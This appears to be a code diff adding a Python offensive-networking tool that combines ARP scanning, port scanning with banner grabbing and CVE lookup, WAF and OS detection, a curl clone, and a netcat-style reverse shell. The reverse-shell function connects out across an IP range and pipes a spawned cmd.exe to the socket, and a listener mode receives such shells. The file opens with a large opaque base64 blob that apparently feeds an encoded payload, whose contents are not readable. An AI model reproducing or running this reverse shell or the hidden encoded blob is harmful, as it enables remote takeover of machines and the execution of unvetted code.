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'))
+import os
+import sys
+import ssl
+import time
+import shutil
+import socket
+import subprocess
+import threading
+import argparse
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+
+try:
+    import requests
+    import vulners
+    from scapy.all import *
+except ImportError as error:
+    print(f"[!] ERROR: {error}")
+    exit(0)
+
+author = "Muhammad Rizki"
+codename = "reztdev"
+__version__ = "1.0.0 (LTS)"
+
+# Protocol mapping
+protos = {1: "icmp", 6: "tcp", 17: "udp"}
+
+# Extended list of common ports and their services
+# You can add to list items
+COMMON_PORTS = {
+    1: "TCP Port Service Multiplexer (TCPMUX) - Used for multiplexing TCP connections.",
+    7: "Echo Protocol - Used to send back any data received, primarily for testing.",
+    9: "Discard Protocol - Similar to echo, it ignores any received data.",
+    11: "SYSTAT - Used to provide information about the system and users.",
+    13: "Daytime Protocol - Used to provide the current date and time.",
+    17: "Quote of the Day (QOTD) - Used to provide a random quote.",
+    19: "Chargen - Character Generator Protocol, used to generate a stream of characters.",
+    20: "FTP (Data Transfer) - Used for transferring files between a client and a server.",
+    21: "FTP (Command) - The control connection for FTP.",
+    22: "SSH - Secure Shell, provides a secure channel over an unsecured network.",
+    23: "Telnet - Unencrypted text communication protocol for remote login.",
+    25: "SMTP - Simple Mail Transfer Protocol for sending emails.",
+    37: "Time Protocol - Used to synchronize clocks over a network.",
+    53: "DNS - Domain Name System for resolving domain names to IP addresses.",
+    67: "DHCP (Server) - Used by servers to assign IP addresses to clients.",
+    68: "DHCP (Client) - Used by clients to receive configuration from DHCP servers.",
+    69: "TFTP - Trivial File Transfer Protocol, a simple file transfer protocol.",
+    70: "Gopher - A distributed document search and retrieval protocol.",
+    80: "HTTP - HyperText Transfer Protocol for transmitting web pages.",
+    81: "HTTP (Alternate) - An alternate port for HTTP traffic.",
+    88: "Kerberos - Network authentication protocol for secure communications.",
+    110: "POP3 - Post Office Protocol version 3 for retrieving emails.",
+    113: "Ident - Identification Protocol for determining the identity of a user.",
+    119: "NNTP - Network News Transfer Protocol for reading and posting Usenet articles.",
+    123: "NTP - Network Time Protocol for synchronizing clocks.",
+    135: "MS RPC - Microsoft Remote Procedure Call.",
+    137: "NetBIOS Name Service - Used for NetBIOS over TCP/IP.",
+    138: "NetBIOS Datagram Service - Used for NetBIOS over TCP/IP.",
+    139: "NetBIOS Session Service - Used for NetBIOS over TCP/IP.",
+    143: "IMAP - Internet Message Access Protocol for accessing emails.",
+    161: "SNMP - Simple Network Management Protocol for network management.",
+    162: "SNMPTRAP - Used for receiving SNMP notifications.",
+    179: "BGP - Border Gateway Protocol, used for routing between autonomous systems.",
+    194: "IRC - Internet Relay Chat protocol for real-time communication.",
+    443: "HTTPS - Secure version of HTTP, used for secure web communication.",
+    445: "Microsoft-DS - Used for SMB over TCP/IP.",
+    465: "SMTP (SSL) - Secure SMTP connection.",
+    487: "SMTP (TLS) - Secure SMTP with STARTTLS.",
+    514: "Syslog - Protocol for logging system messages.",
+    522: "XMPP - Extensible Messaging and Presence Protocol.",
+    543: "Klogin - Kerberos Login Protocol.",
+    544: "Kshell - Kerberos Shell Protocol.",
+    587: "SMTP (Submission) - Used for submitting emails securely.",
+    631: "IPP - Internet Printing Protocol for printing services.",
+    993: "IMAP (SSL) - Secure version of IMAP.",
+    995: "POP3 (SSL) - Secure version of POP3.",
+    1080: "SOCKS Proxy - Used for proxying network traffic.",
+    1194: "OpenVPN - Used for OpenVPN connections.",
+    1433: "MSSQL - Microsoft SQL Server database service.",
+    1434: "MSSQL (UDP) - Used for SQL Server Resolution Service.",
+    1723: "PPTP VPN - Point-to-Point Tunneling Protocol.",
+    3306: "MySQL - MySQL database service.",
+    3389: "RDP - Remote Desktop Protocol for remote access.",
+    5060: "SIP - Session Initiation Protocol for multimedia communication.",
+    5061: "SIP (TLS) - Secure version of SIP.",
+    5432: "PostgreSQL - PostgreSQL database service.",
+    5900: "VNC - Virtual Network Computing for remote desktop sharing.",
+    6379: "Redis - In-memory data structure store, used as a database.",
+    8080: "HTTP Proxy - Alternate port for HTTP traffic.",
+    8443: "HTTPS (Alternate) - Alternate port for secure web applications.",
+    8888: "HTTP (Alternate) - Another alternate port for HTTP.",
+    9000: "PHP-FPM - PHP FastCGI Process Manager.",
+    9090: "Webmin - Web-based interface for system administration.",
+    9200: "Elasticsearch - RESTful search and analytics engine.",
+    9300: "Elasticsearch (Transport) - For inter-node communication in an Elasticsearch cluster.",
+    27017: "MongoDB - NoSQL database service.",
+}
+
+def read_api_key(file_path="api.key"):
+    with open(file_path, "r") as file:
+        return file.read().strip()
+
+# Function to check vulnerabilities using Vulners
+def check_vulnerabilities(service):
+    api_key = read_api_key()
+    client = vulners.VulnersApi(api_key=api_key)
+    results = client.find_all(service)
+    return results
+
+
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+def receiver(conn):
+    while True:
+        try:
+            data = conn.recv(1)
+            print(data.decode(), end="", flush=True)
+        except:
+            print("[!] Server/socket must have died...time to hop off")
+            conn.close()
+            os._exit(0)
+
+def sender(conn):
+    while True:
+        mycmd = input("")
+        mycmd = mycmd + "\n"
+        try:
+            conn.send(mycmd.encode())
+        except:
+            print("[!] Server/socket must have died...time to hop off")
+            conn.close()
+            os._exit(0)
+
+def scan(target, interface):
+    warnings.filterwarnings("ignore")
+    try:
+        conf.verb = 0
+        print("[*] Scanning host ..")
+
+        arp = ARP(pdst=target)
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether / arp
+
+        result = srp(packet, timeout=3, verbose=0, iface=interface)[0]
+
+        clients = []
+        for sent, received in result:
+            clients.append({'ip': received.psrc, 'mac': received.hwsrc})
+            reply = sr1(IP(dst=received.psrc) / ICMP(), timeout=1, verbose=0)
+            if reply:
+                if reply.ttl <= 64:
+                    os = "Linux/Unix"
+                else:
+                    os = "Windows"
+                clients[-1]['os'] = os
+            else:
+                clients[-1]['os'] = "Unknown"
+
+        print("[*] Scanning completed.\n")
+        time.sleep(0.8)
+        print("\tAvailable devices")
+        print("\t-----------------")
+        print("\tIP" + " "*18 + "MAC" + " "*18 + "OS")
+        print("\t--" + " "*18 + "---" + " "*18 + "--")
+        for client in clients:
+            print("\t{:16}    {:18}   {}".format(client['ip'], client['mac'], client.get('os', 'Unknown')))
+        print("\n")
+    except PermissionError:
+        print("[!] Root privileges required to run.")
+
+def ensure_scheme(url):
+    if not url.startswith(('http://', 'https://')):
+        print(f"[!] No scheme supplied. Assuming 'http://' for {url}")
+        return 'http://' + url
+    return url
+
+def fetch_url(url, method='GET', headers=None, data=None, output_file=None, show_headers=True, show_body=True):
+    try:
+        response = requests.request(method, url, headers=headers, data=data)
+        response.raise_for_status() 
+    except requests.exceptions.SSLError as ssl_err:
+        print(f"[!] Error occurred (HTTPS): {ssl_err}")
+        return
+    except requests.exceptions.HTTPError as http_err:
+        print(f"[!] HTTP error occurred: {http_err}")
+        return
+    except Exception as err:
+        print(f"[!] An error occurred: {err}")
+        return
+
+    if show_headers:
+        print(f"[*] Status Code: {response.status_code}")
+        print("[+] Response Headers:")
+        for key, value in response.headers.items():
+            print(f"{key}: {value}")
+
+    if show_body:
+        if output_file:
+            with open(output_file, 'wb') as f:
+                f.write(response.content)
+            print(f"[*] Content written to {output_file}")
+        else:
+            print("\n[+] Response Content:")
+            print(response.text)
+
+def print_ip_header(ip_packet):
+    ihl = ip_packet.ihl
+    tos = ip_packet.tos
+    length = ip_packet.len
+    identifier = ip_packet.id
+    flags = ip_packet.flags
+    protocol = protos.get(ip_packet.proto, ip_packet.proto)
+    chksum = hex(ip_packet.chksum)
+    print(f"IP Header: ihl={ihl}, tos={hex(tos)}, len={length}, id={identifier}, flags={flags}, proto={protocol}, chksum={chksum}")
+
+def ping(host, ttl=20, count=5, payload=None, verbose=False, protocol='icmp'):
+    try:
+        sent_packets = 0
+        received_packets = 0
+        min_rtt = float('inf')
+        max_rtt = float('-inf')
+        total_rtt = 0
+        packet_loss = 0
+
+        for i in range(1, count+1):
+            if protocol == 'icmp':
+                packet = IP(dst=host, ttl=ttl)/ICMP()/Raw(load=payload)
+            elif protocol == 'tcp':
+                packet = IP(dst=host, ttl=ttl)/TCP()/Raw(load=payload)
+            elif protocol == 'udp':
+                packet = IP(dst=host, ttl=ttl)/UDP()/Raw(load=payload)
+            else:
+                print("Invalid protocol specified. Supported protocol: icmp, tcp, udp.")
+                return
+
+            start_time = time.time()
+            reply = sr1(packet, timeout=2, verbose=0)
+            end_time = time.time()
+            if reply:
+                times = (end_time - start_time) * 100
+                print(f"{len(reply)} bytes {host} ({reply.src}) {protocol.upper()}_seq={i} ttl={reply.ttl} payload={packet[Raw].load} time={times:.2f} ms ")
+                received_packets += 1
+                min_rtt = min(min_rtt, times)
+                max_rtt = max(max_rtt, times)
+                total_rtt += times
+                if verbose:
+                    print_ip_header(reply)
+                    print("Hex Data:")
+                    hexdump(reply)
+                    print("")
+            else:
+                print(f"{host} Request timed out {protocol.upper()}_seq={i}")
+        
+            sent_packets += 1
+            time.sleep(1)
+        
+        packet_loss = (sent_packets - received_packets) / sent_packets * 100
+        print(f"\n--- Ping statistics {host} ---:")
+        print(f"  Packets: Sent = {sent_packets}, Received = {received_packets}, Lost = {sent_packets-received_packets} ({packet_loss:.0f}% loss)")
+        if received_packets > 0:
+            avg_rtt = total_rtt / received_packets
+            print("--- Approximate round trip times in milli-seconds ---:")
+            print(f"  Minimum = {min_rtt:.2f}ms, Maximum = {max_rtt:.2f}ms, Average = {avg_rtt:.2f}ms")
+
+    except KeyboardInterrupt:
+        print(f"\n--- {protocol.upper()} Ping statistics for {host} ---:")
+        print(f"  Packets: Sent = {count}, Received = {received_packets}, Lost = {count-received_packets} ({packet_loss:.0f}% loss)")
+    except socket.gaierror:
+        print("No internet connection")
+    except PermissionError:
+        print("Operation not permitted (as Root/Admin)")
+
+# Function to get the service name for a port
+def get_service(port):
+    return COMMON_PORTS.get(port, "Unknown service")
+
+# WAF detection function
+def detect_waf(url):
+    try:
+        response = requests.get(url, timeout=5)
+        waf_detected = False
+
+        # Check common WAF headers or response behaviors
+        if 'Server' in response.headers:
+            server_header = response.headers['Server'].lower()
+            if 'cloudflare' in server_header:
+                print("[+] Detected Cloudflare WAF")
+                waf_detected = True
+            elif 'sucuri' in server_header:
+                print("[+] Detected Sucuri WAF")
+                waf_detected = True
+
+        if response.status_code == 403:
+            print("[?] WAF likely detected due to 403 Forbidden response")
+            waf_detected = True
+
+        if waf_detected:
+            print("[+] WAF detected on target.")
+        else:
+            print("[?] No WAF detected.")
+    except requests.RequestException as e:
+        print(f"[!] WAF detection failed: {str(e)}")
+
+# OS detection function (ICMP-based for simplicity)
+def detect_os(ip):
+    try:
+        ping = sr1(IP(dst=ip)/ICMP(), timeout=1, verbose=0)
+        if ping:
+            ttl = ping.ttl
+            if ttl <= 64:
+                return "Linux/Unix"
+            elif ttl <= 128:
+                return "Windows"
+            else:
+                return "Unknown"
+        else:
+            return "Unknown"
+    except Exception as e:
+        print(f"[!] Error detecting OS: {e}")
+        return "Unknown"
+
+# More detailed OS detection (using TCP handshake fingerprinting)
+def detect_detailed_os(target, port):
+    try:
+        syn = IP(dst=target)/TCP(dport=port, flags='S')
+        syn_ack = sr1(syn, timeout=2, verbose=0)
+        if syn_ack:
+            ttl = syn_ack.ttl
+            window_size = syn_ack[TCP].window
+            if ttl == 64 and window_size == 29200:
+                return "Linux 4.x/5.x (likely)"
+            elif ttl == 128 and window_size == 8192:
+                return "Windows Server 2016/2019"
+            else:
+                return "Unknown OS version"
+        else:
+            return "Unknown OS"
+    except Exception as e:
+        print(f"[!] Error detecting detailed OS: {e}")
+        return "Unknown OS"
+
+# Function to grab banner
+def grab_banner(target_ip, port):
+    try:
+        if port == 443:
+            context = ssl.create_default_context()
+            with socket.create_connection((target_ip, port), timeout=2) as sock:
+                with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
+                    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
+                    ssock.sendall(request.encode())
+                    response = ssock.recv(4096).decode().strip()
+                    return response
+        else:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((target_ip, port))
+            banner = s.recv(1024).decode().strip()
+            s.close()
+            return banner
+    except Exception:
+        return None
+
+# Function to check SSL/TLS details
+def check_ssl_certificate(target_ip, port):
+    context = ssl.create_default_context()
+    try:
+        with socket.create_connection((target_ip, port)) as sock:
+            with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
+                cert = ssock.getpeercert()
+                return cert
+    except Exception as e:
+        print(f"[!] SSL error: {e}")
+        return None
+
+# Function to scan a single port and check for vulnerabilities
+def scan_port(target, port, timeout=1):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        result = s.connect_ex((target, port))
+        
+        if result == 0:
+            service = get_service(port)
+            print(f"[+] Port {port} is open ({service})")
+            
+            if port == 443:
+                cert = check_ssl_certificate(target, port)
+                if cert:
+                    print("    [+] SSL Certificate Information:")
+                    print(f"        Issuer: {cert['issuer']}")
+                    print(f"        Subject: {cert['subject']}")
+                else:
+                    print("    [!] No SSL certificate information available.")
+            else:
+                banner = grab_banner(target, port)
+                if banner:
+                    print(f"    [+] Banner: {banner}")
+            
+            # Check for vulnerabilities based on service
+            vulnerabilities = check_vulnerabilities(service)
+            if vulnerabilities:
+                print("    [+] Vulnerabilities Detected:")
+                for vulnerability in vulnerabilities:
+                    vuln_type = vulnerability.get('type', 'N/A')
+                    cve_id = vulnerability.get('id', 'N/A')
+                    link = vulnerability.get('link', 'N/A')
+                    print(f"        - Type: {vuln_type}, CVE: {cve_id}, Link: {link}")
+            else:
+                print("    [?] No known vulnerabilities detected.")
+        s.close()
+    except Exception as e:
+        print(f"[!] Error scanning port {port}: {str(e)}")
+
+
+# Function to scan multiple ports using threading
+def scan_ports(target, ports, timeout=1):
+    print(f"[..] Starting port scan on {target}")
+    
+    try:
+        target_ip = socket.gethostbyname(target)
+        print(f"[*] Target IP: {target_ip}")
+    except socket.gaierror:
+        print(f"[!] Could not resolve hostname: {target}")
+        return
+
+    print(f"[..] Scanning started at {datetime.now()}\n")
+    
+    # Perform OS detection before scanning ports
+    os_basic = detect_os(target_ip)
+    os_detailed = detect_detailed_os(target_ip, ports)
+    print(f"[*] OS Detected (basic): {os_basic}")
+    print(f"[*] OS Detected (detailed): {os_detailed}")
+
+    # Perform port scanning
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        for port in ports:
+            executor.submit(scan_port, target_ip, port, timeout)
+
+    # Perform WAF detection after scanning
+    url = f"http://{target}"  # Assuming HTTP for WAF detection
+    detect_waf(url)
+
+    print(f"\n[+] Scanning completed at {datetime.now()}")
+
+
+def create_socket():
+    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+def reverse_tcp_windows(ip_range_start, ip_range_end, port, base_ip, execute):
+    connected = False
+    while True:
+        for i in range(int(ip_range_start), int(ip_range_end) + 1):
+            ip = f'{base_ip}.{i}'
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, port))
+                s.settimeout(2)
+                s.settimeout(None)
+                connected = True
+                print(f"[+] Connected {ip}")
+                
+                # Mencari path executable di PATH
+                execute_path = shutil.which(execute)
+                if not execute_path:
+                    print(f"[!] Executable {execute} not found in PATH.")
+                    continue
+                
+                x = subprocess.Popen([execute_path], stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+                _s2p = threading.Thread(target=s2p, args=[s, x])
+                _s2p.daemon = True
+                _s2p.start()
+                _p2s = threading.Thread(target=p2s, args=[s, x])
+                _p2s.daemon = True
+                _p2s.start()
+                try:
+                    x.wait()
+                except KeyboardInterrupt:
+                    s.close()
+                    sys.exit()
+            except socket.error as er:
+                print(f"{ip} Connection Timeout!!")
+                time.sleep(1)
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Netcat with Multi functionality",
+        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=90)
+    )
+    parser.add_argument("--version", action="version", version=f"Version: %(prog)s {__version__} by {codename}",
+                        help="Show the version of the program")
+    subparsers = parser.add_subparsers(dest="mode", help="Choose between for you like")
+
+    reverse_parser = subparsers.add_parser("reverse", help="Reverse Shell TCP similar to netcat", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
+    reverse_parser.add_argument("-i", "--ip", type=str, default="0.0.0.0", help="IP address to bind (default: 0.0.0.0)")
+    reverse_parser.add_argument("-p", "--port", type=int, required=True, help="Port number to bind")
+    reverse_parser.add_argument("--ip-range-start", type=int, help="Start of IP range for reverse TCP")
+    reverse_parser.add_argument("--ip-range-end", type=int, help="End of IP range for reverse TCP")
+    reverse_parser.add_argument("--base-ip", type=str, default="192.168.18", help="Base IP for reverse TCP (default: 192.168.18)")
+    reverse_parser.add_argument("-e", "--execute", type=str, default="cmd.exe", help="Executable to run (default: cmd.exe)")
+
+    ping_parser = subparsers.add_parser("ping", help="Ping with support protocol ICMP, TCP, UDP", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
+    ping_parser.add_argument("--host", type=str, required=True, help="Target host to ping")
+    ping_parser.add_argument("--ttl", type=int, default=20, help="Time-to-live (TTL) for ping (default: 20)")
+    ping_parser.add_argument("--count", type=int, default=5, help="Number of ping requests to send (default: 5)")
+    ping_parser.add_argument("--payload", type=str, default=None, help="Custom payload to send in ping")
+    ping_parser.add_argument("--verbose", action="store_true", help="Enable verbose output for ping")
+    ping_parser.add_argument("--protocol", type=str, choices=['icmp', 'tcp', 'udp'], default='icmp', help="Protocol to use for ping (default: icmp)")
+
+    scan_parser = subparsers.add_parser("scan", help="ARP Scan on local network", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
+    scan_parser.add_argument("-t", "--target", required=True, help="Target IP address range (e.g., 192.168.1.0/24)")
+    scan_parser.add_argument("-i", "--iface", help="Interface to use (default: 'conf.iface')")
+
+    curl_parser = subparsers.add_parser('curl', help='HTTP/HTTPS request similar to curl')
+    curl_parser.add_argument('url', help="The URL to fetch (HTTP or HTTPS)")
+    curl_parser.add_argument('-X', '--request', help="Specify request method (e.g., GET, POST)", default='GET')
+    curl_parser.add_argument('-H', '--header', action='append', help="Pass custom header(s) to server (e.g., 'User-Agent: my-app')")
+    curl_parser.add_argument('-d', '--data', help="Send POST data")
+    curl_parser.add_argument('-o', '--output', help="Write output to <file> instead of stdout")
+    curl_parser.add_argument('--headers-only', action='store_true', help="Only show response headers")
+    curl_parser.add_argument('--body-only', action='store_true', help="Only show response body")
+
+    port_parser = subparsers.add_parser("scanport", help="Port Scanner with Banner Grabbing, SSL Check, WAF, OS Detection dan Vulnerabilities", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
+    port_parser.add_argument("-t", "--target", required=True, help="Target hostname or IP to scan")
+    port_parser.add_argument('-sp', '--start-port', type=int, help='Start of the port range (e.g., 20)')
+    port_parser.add_argument('-ep', '--end-port', type=int, help='End of the port range (e.g., 80)')
+    port_parser.add_argument('-p', '--ports', type=int, help='Specific ports to scan (e.g., 22 80 443)')
+    port_parser.add_argument('-tm', '--timeout', type=int, default=1, help='Timeout for each port scan (in seconds, default: 1)')
+
+    args = parser.parse_args()
+
+    if args.mode == "reverse":
+        if args.ip_range_start and args.ip_range_end:
+            reverse_tcp_windows(args.ip_range_start, args.ip_range_end, args.port, args.base_ip, args.execute)
+        else:
+            host = args.ip if args.ip else "0.0.0.0"  # Default to listening on all interfaces if base_ip is not provided
+            port = args.port
+
+            # Create a socket with the specified protocol
+            s = create_socket()
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind((host, port))
+
+            s.listen(5)
+            print(f"\n[*] Listening on {host}:{port}")
+            conn, addr = s.accept()
+            print(f'[*] Accepted new connection from: {addr[0]}:{addr[1]}\n')
+
+            # Start threads for sending and receiving data
+            threading.Thread(target=receiver, args=[conn], daemon=True).start()
+            threading.Thread(target=sender, args=[conn], daemon=True).start()
+
+            while True:
+                time.sleep(1)
+
+    elif args.mode == "ping":
+        ping(args.host, ttl=args.ttl, count=args.count, payload=args.payload, verbose=args.verbose, protocol=args.protocol)
+
+    elif args.mode == "scan":
+        interface = args.iface if args.iface else conf.iface
+        scan(args.target, interface)
+    
+    elif args.mode == 'curl':
+        url = ensure_scheme(args.url)
+        headers = {}
+        if args.header:
+            for header in args.header:
+                key, value = header.split(':', 1)
+                headers[key.strip()] = value.strip()
+
+        show_headers = not args.body_only
+        show_body = not args.headers_only
+
+        fetch_url(url, method=args.request, headers=headers, data=args.data, output_file=args.output, show_headers=show_headers, show_body=show_body)
+    
+    elif args.mode == "scanport":
+        if args.ports:
+            ports = args.ports
+        elif args.start_port and args.end_port:
+            ports = range(args.start_port, args.end_port + 1)
+        else:
+            ports = list(COMMON_PORTS)
+        scan_ports(args.target, ports, args.timeout)
+    
+    else:
+        parser.print_help()
+
+
+if __name__ == "__main__":
+    main()
